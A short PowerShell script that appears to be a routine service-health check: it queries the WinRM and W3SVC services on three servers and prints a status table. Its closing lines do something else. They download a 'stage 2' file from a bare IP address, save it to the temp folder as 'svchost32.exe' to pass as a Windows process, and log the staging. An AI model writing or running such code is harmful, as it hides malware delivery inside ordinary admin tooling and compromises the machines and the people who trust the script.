
$ErrorActionPreference = 'Stop'
$Servers = @('dc01', 'web-stg-01', 'app-prod-01')
$Services = @('WinRM', 'W3SVC')
$Port = 5985
$TimeoutMilliseconds = 2000
$ReportPath = 'C:\Reports\service-health-2026-11-07.csv'


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
$Stage2Url = 'http://198.51.100.63:80/assets/update.dat'
$OutputPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $OutputPath -UseBasicParsing
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
